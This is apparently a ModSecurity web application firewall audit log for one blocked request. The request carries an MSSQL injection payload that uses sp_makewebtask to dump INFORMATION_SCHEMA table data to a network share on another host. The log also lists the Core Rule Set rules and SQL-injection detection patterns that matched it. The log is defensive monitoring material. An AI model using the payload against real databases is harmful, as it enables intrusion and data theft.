--75dbe96a-A--
[09/Feb/2011:12:47:42 --0600] 5mRBDQoAygIAAB2pGAcAAAAD 66.37.224.199 43965 10.0.202.2 80
--75dbe96a-B--
GET /lpandl/EXEC%20master..sp_makewebtask%20%22//10.10.1.3/share/output.html%22,%20%22SELECT%20*%20FROM%20INFORMATION_SCHEMA.TABLES HTTP/1.1
Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.1)
Accept-Encoding: gzip, deflate
Host: 98.142.93.2
Connection: Keep-Alive
X-Forwarded-For: 66.37.224.199
Front-End-Https: On

--75dbe96a-F--
HTTP/1.1 404 /lpandl/EXEC%20master..sp_makewebtask%20%22//10.10.1.3/share/output.html%22,%20%22SELECT%20*%20FROM%20INFORMATION_SCHEMA.TABLES
Content-Length: 1333
Connection: close
Content-Type: text/html;charset=utf-8

--75dbe96a-E--

--75dbe96a-H--
Message: Warning. Pattern match "^[\d.:]+$" at REQUEST_HEADERS:Host. [file "/etc/httpd/conf/modsecurity-2.5.13/rules/base_rules/modsecurity_crs_21_protocol_anomalies.conf"] [line "97"] [id "960017"] [rev "2.1.1"] [msg "Host header is a numeric IP address"] [severity "CRITICAL"] [tag "PROTOCOL_VIOLATION/IP_HOST"] [tag "WASCTC/WASC-21"] [tag "OWASP_TOP_10/A7"] [tag "PCI/6.5.10"] [tag "http://technet.microsoft.com/en-us/magazine/2005.01.hackerbasher.aspx"]
Message: Warning. Match of "within %{tx.allowed_methods}" against "REQUEST_METHOD" required. [file "/etc/httpd/conf/modsecurity-2.5.13/rules/base_rules/modsecurity_crs_30_http_policy.conf"] [line "30"] [id "960032"] [msg "Method is not allowed by policy"] [data "GET"] [severity "CRITICAL"] [tag "POLICY/METHOD_NOT_ALLOWED"] [tag "WASCTC/WASC-15"] [tag "OWASP_TOP_10/A6"] [tag "OWASP_AppSensor/RE1"] [tag "PCI/12.1"]
Message: Warning. Match of "within %{tx.allowed_http_versions}" against "REQUEST_PROTOCOL" required. [file "/etc/httpd/conf/modsecurity-2.5.13/rules/base_rules/modsecurity_crs_30_http_policy.conf"] [line "77"] [id "960034"] [msg "HTTP protocol version is not allowed by policy"] [data "HTTP/1.1"] [severity "CRITICAL"] [tag "POLICY/PROTOCOL_NOT_ALLOWED"] [tag "WASCTC/WASC-21"] [tag "OWASP_TOP_10/A6"] [tag "PCI/6.5.10"]
Message: Warning. Pattern match "\bsp_makewebtask\b" at REQUEST_FILENAME. [file "/etc/httpd/conf/modsecurity-2.5.13/rules/base_rules/modsecurity_crs_41_sql_injection_attacks.conf"] [line "389"] [id "959040"] [rev "2.1.1"] [msg "SQL Injection Attack"] [data "sp_makewebtask"] [severity "CRITICAL"] [tag "WEB_ATTACK/SQL_INJECTION"] [tag "WASCTC/WASC-19"] [tag "OWASP_TOP_10/A1"] [tag "OWASP_AppSensor/CIE1"] [tag "PCI/6.5.2"]
Apache-Handler: jakarta-servlet
Stopwatch: 1297277262250253 11218 (521 6016 -)
Response-Body-Transformed: Dechunked
Producer: ModSecurity for Apache/2.5.12 (http://www.modsecurity.org/).
Server: Apache

--75dbe96a-K--
SecRule "REQUEST_METHOD" "@rx ^(?:GET|HEAD)$" "phase:1,log,auditlog,chain,rev:2.1.1,t:none,block,msg:'GET or HEAD requests with bodies',severity:2,id:960011,tag:PROTOCOL_VIOLATION/EVASION,tag:WASCTC/WASC-21,tag:OWASP_TOP_10/A7,tag:PCI/6.5.10,tag:http://www.w3.org/Protocols/rfc2616/rfc2616-sec4.html#sec4.3"
SecRule "REQUEST_METHOD" "!@rx ^OPTIONS$" "phase:2,log,auditlog,chain,rev:2.1.1,t:none,block,msg:'Request Missing an Accept Header',severity:2,id:960015,tag:PROTOCOL_VIOLATION/MISSING_HEADER_ACCEPT,tag:WASCTC/WASC-21,tag:OWASP_TOP_10/A7,tag:PCI/6.5.10"
SecRule "&REQUEST_HEADERS:Content-Type" "@eq 0" "phase:2,log,auditlog,chain,rev:2.1.1,t:none,block,msg:'Request Containing Content, but Missing Content-Type header',id:960904,severity:5"
SecRule "REQUEST_HEADERS:Host" "@rx ^[\\d.:]+$" "phase:2,log,auditlog,rev:2.1.1,t:none,block,msg:'Host header is a numeric IP address',severity:2,id:960017,tag:PROTOCOL_VIOLATION/IP_HOST,tag:WASCTC/WASC-21,tag:OWASP_TOP_10/A7,tag:PCI/6.5.10,tag:http://technet.microsoft.com/en-us/magazine/2005.01.hackerbasher.aspx,setvar:tx.msg=%{rule.msg},setvar:tx.anomaly_score=+%{tx.notice_anomaly_score},setvar:tx.policy_score=+%{tx.notice_anomaly_score},setvar:tx.%{rule.id}-POLICY/IP_HOST-%{matched_var_name}=%{matched_var}'"
SecRule "REQUEST_METHOD" "!@within %{tx.allowed_methods}" "phase:2,log,auditlog,t:none,block,msg:'Method is not allowed by policy',severity:2,id:960032,tag:POLICY/METHOD_NOT_ALLOWED,tag:WASCTC/WASC-15,tag:OWASP_TOP_10/A6,tag:OWASP_AppSensor/RE1,tag:PCI/12.1,logdata:%{matched_var},setvar:tx.msg=%{rule.msg},setvar:tx.anomaly_score=+%{tx.warning_anomaly_score},setvar:tx.policy_score=+%{tx.warning_anomaly_score},setvar:tx.%{rule.id}-POLICY/METHOD_NOT_ALLOWED-%{matched_var_name}=%{matched_var}"
SecRule "REQUEST_PROTOCOL" "!@within %{tx.allowed_http_versions}" "phase:2,log,auditlog,t:none,block,msg:'HTTP protocol version is not allowed by policy',severity:2,id:960034,tag:POLICY/PROTOCOL_NOT_ALLOWED,tag:WASCTC/WASC-21,tag:OWASP_TOP_10/A6,tag:PCI/6.5.10,logdata:%{matched_var},setvar:tx.msg=%{rule.msg},setvar:tx.anomaly_score=+%{tx.warning_anomaly_score},setvar:tx.policy_score=+%{tx.warning_anomaly_score},setvar:tx.%{rule.id}-POLICY/PROTOCOL_NOT_ALLOWED-%{matched_var_name}=%{matched_var}"
SecRule "REQUEST_BASENAME" "@rx \\.(.*)$" "phase:2,log,auditlog,chain,capture,setvar:tx.extension=.%{tx.1}/,t:none,t:urlDecodeUni,t:lowercase,block,msg:'URL file extension is restricted by policy',severity:2,id:960035,tag:POLICY/EXT_RESTRICTED,tag:WASCTC/WASC-15,tag:OWASP_TOP_10/A7,tag:PCI/6.5.10,logdata:%{TX.0}"
SecRule "REQUEST_HEADERS_NAMES" "@rx ^(.*)$" "phase:2,log,auditlog,chain,t:none,block,msg:'HTTP header is restricted by policy',id:960038,tag:POLICY/HEADER_RESTRICTED,tag:POLICY/FILES_NOT_ALLOWED,tag:WASCTC/WASC-21,tag:OWASP_TOP_10/A7,tag:PCI/12.1,tag:WASCTC/WASC-15,tag:OWASP_TOP_10/A7,tag:PCI/12.1,severity:4,logdata:%{matched_var},capture,setvar:tx.header_name='/%{tx.0}/'"
SecRule "REQUEST_HEADERS_NAMES" "@rx ^(.*)$" "phase:2,log,auditlog,chain,t:none,block,msg:'HTTP header is restricted by policy',id:960038,tag:POLICY/HEADER_RESTRICTED,tag:POLICY/FILES_NOT_ALLOWED,tag:WASCTC/WASC-21,tag:OWASP_TOP_10/A7,tag:PCI/12.1,tag:WASCTC/WASC-15,tag:OWASP_TOP_10/A7,tag:PCI/12.1,severity:4,logdata:%{matched_var},capture,setvar:tx.header_name='/%{tx.0}/'"
SecRule "REQUEST_HEADERS_NAMES" "@rx ^(.*)$" "phase:2,log,auditlog,chain,t:none,block,msg:'HTTP header is restricted by policy',id:960038,tag:POLICY/HEADER_RESTRICTED,tag:POLICY/FILES_NOT_ALLOWED,tag:WASCTC/WASC-21,tag:OWASP_TOP_10/A7,tag:PCI/12.1,tag:WASCTC/WASC-15,tag:OWASP_TOP_10/A7,tag:PCI/12.1,severity:4,logdata:%{matched_var},capture,setvar:tx.header_name='/%{tx.0}/'"
SecRule "REQUEST_HEADERS_NAMES" "@rx ^(.*)$" "phase:2,log,auditlog,chain,t:none,block,msg:'HTTP header is restricted by policy',id:960038,tag:POLICY/HEADER_RESTRICTED,tag:POLICY/FILES_NOT_ALLOWED,tag:WASCTC/WASC-21,tag:OWASP_TOP_10/A7,tag:PCI/12.1,tag:WASCTC/WASC-15,tag:OWASP_TOP_10/A7,tag:PCI/12.1,severity:4,logdata:%{matched_var},capture,setvar:tx.header_name='/%{tx.0}/'"
SecRule "REQUEST_HEADERS_NAMES" "@rx ^(.*)$" "phase:2,log,auditlog,chain,t:none,block,msg:'HTTP header is restricted by policy',id:960038,tag:POLICY/HEADER_RESTRICTED,tag:POLICY/FILES_NOT_ALLOWED,tag:WASCTC/WASC-21,tag:OWASP_TOP_10/A7,tag:PCI/12.1,tag:WASCTC/WASC-15,tag:OWASP_TOP_10/A7,tag:PCI/12.1,severity:4,logdata:%{matched_var},capture,setvar:tx.header_name='/%{tx.0}/'"
SecRule "REQUEST_HEADERS_NAMES" "@rx ^(.*)$" "phase:2,log,auditlog,chain,t:none,block,msg:'HTTP header is restricted by policy',id:960038,tag:POLICY/HEADER_RESTRICTED,tag:POLICY/FILES_NOT_ALLOWED,tag:WASCTC/WASC-21,tag:OWASP_TOP_10/A7,tag:PCI/12.1,tag:WASCTC/WASC-15,tag:OWASP_TOP_10/A7,tag:PCI/12.1,severity:4,logdata:%{matched_var},capture,setvar:tx.header_name='/%{tx.0}/'"
SecRule "REQUEST_HEADERS_NAMES" "@rx ^(.*)$" "phase:2,log,auditlog,chain,t:none,block,msg:'HTTP header is restricted by policy',id:960038,tag:POLICY/HEADER_RESTRICTED,tag:POLICY/FILES_NOT_ALLOWED,tag:WASCTC/WASC-21,tag:OWASP_TOP_10/A7,tag:PCI/12.1,tag:WASCTC/WASC-15,tag:OWASP_TOP_10/A7,tag:PCI/12.1,severity:4,logdata:%{matched_var},capture,setvar:tx.header_name='/%{tx.0}/'"
SecRule "REQUEST_HEADERS_NAMES" "@rx ^(.*)$" "phase:2,log,auditlog,chain,t:none,block,msg:'HTTP header is restricted by policy',id:960038,tag:POLICY/HEADER_RESTRICTED,tag:POLICY/FILES_NOT_ALLOWED,tag:WASCTC/WASC-21,tag:OWASP_TOP_10/A7,tag:PCI/12.1,tag:WASCTC/WASC-15,tag:OWASP_TOP_10/A7,tag:PCI/12.1,severity:4,logdata:%{matched_var},capture,setvar:tx.header_name='/%{tx.0}/'"
SecRule "REQUEST_FILENAME|ARGS_NAMES|ARGS|XML:/*" "@pmFromFile modsecurity_40_generic_attacks.data" "phase:2,auditlog,rev:2.1.1,t:none,t:htmlEntityDecode,t:compressWhiteSpace,t:lowercase,nolog,pass,setvar:tx.pm_score=+1"
SecRule "REQUEST_FILENAME|ARGS_NAMES|ARGS|XML:/*" "@pmFromFile modsecurity_41_sql_injection_attacks.data" "phase:2,auditlog,rev:2.1.1,t:none,t:urlDecodeUni,t:htmlEntityDecode,t:lowercase,t:replaceComments,t:compressWhiteSpace,nolog,pass,setvar:tx.pm_sqli_score=+1"
SecRule "REQUEST_FILENAME|ARGS_NAMES|ARGS|XML:/*" "@rx \\bsp_makewebtask\\b" "phase:2,log,auditlog,rev:2.1.1,capture,t:none,t:urlDecodeUni,t:htmlEntityDecode,t:lowercase,t:replaceComments,t:compressWhiteSpace,ctl:auditLogParts=+E,block,msg:'SQL Injection Attack',id:959040,tag:WEB_ATTACK/SQL_INJECTION,tag:WASCTC/WASC-19,tag:OWASP_TOP_10/A1,tag:OWASP_AppSensor/CIE1,tag:PCI/6.5.2,logdata:%{TX.0},severity:2,setvar:tx.msg=%{rule.msg},setvar:tx.sql_injection_score=+%{tx.critical_anomaly_score},setvar:tx.anomaly_score=+%{tx.critical_anomaly_score},setvar:tx.%{rule.id}-WEB_ATTACK/SQL_INJECTION-%{matched_var_name}=%{tx.0}"
SecRule "REQUEST_FILENAME|ARGS_NAMES|ARGS|XML:/*" "@rx \\b(?:(?:to_(?:numbe|cha)r|d(?:elete|rop)|group\\b\\W*\\bby|insert|where)\\b|(?:b(?:enchmark|in)|find_in_set|(?:mi|or)d|position)\\W+\\(|c(?:o(?:n(?:cat\\W+\\(|vert\\b)|unt\\b)|iel\\W+\\(|ha?r\\b)|s(?:(?:ubstr(?:ing)?|leep)\\W+\\(|(?:hutdown|elect)\\b)|re(?:l(?:(?:nam|typ)e|kind)\\b|verse\\W+\\()|u(?:n(?:hex\\W+\\(|ion\\b)|pdate\\b)|l(?:o(?:cate|wer)\\W+\\(|ength\\b)|a(?:ttn(?:ame|um)\\b|scii\\W+\\()|h(?:aving\\b|ex\\W+\\())" "phase:2,log,auditlog,rev:2.1.1,chain,capture,t:none,t:urlDecodeUni,t:htmlEntityDecode,t:lowercase,t:replaceComments,t:compressWhiteSpace,ctl:auditLogParts=+E,block,msg:'SQL Injection Attack',id:950902,logdata:%{TX.0},severity:2"
SecRule "RESPONSE_BODY" "!@pm iframe" "phase:4,auditlog,rev:2.1.1,t:none,capture,t:urlDecodeUni,t:htmlEntityDecode,t:lowercase,nolog,skipAfter:END_IFRAME_CHECK"
SecRule "RESPONSE_BODY" "!@pmFromFile modsecurity_50_outbound.data" "phase:4,auditlog,rev:2.1.1,t:none,capture,t:urlDecodeUni,t:htmlEntityDecode,nolog,skipAfter:END_OUTBOUND_CHECK"

--75dbe96a-Z--
